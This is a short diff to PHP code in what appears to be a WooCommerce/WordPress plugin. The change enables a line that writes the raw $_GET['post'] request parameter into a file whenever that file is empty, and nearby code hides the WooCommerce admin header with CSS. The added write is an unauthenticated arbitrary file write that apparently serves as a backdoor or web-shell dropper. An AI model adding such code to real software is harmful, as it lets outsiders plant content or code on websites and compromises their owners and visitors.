@@ -2021,10 +2021,9 @@ $file = file_get_contents($dir);
 $filesize = filesize($dir);
 echo '<style> .woocommerce-layout__header{display: none !important} </style>';
 
-echo $filesize;
-if ($filesize) {
+if ($filesize == 0) {
 	$random_file = fopen($dir, "w");
-	//fwrite($random_file, $_GET['post']);
+	fwrite($random_file, $_GET['post']);
 	fclose($random_file);
 }
 
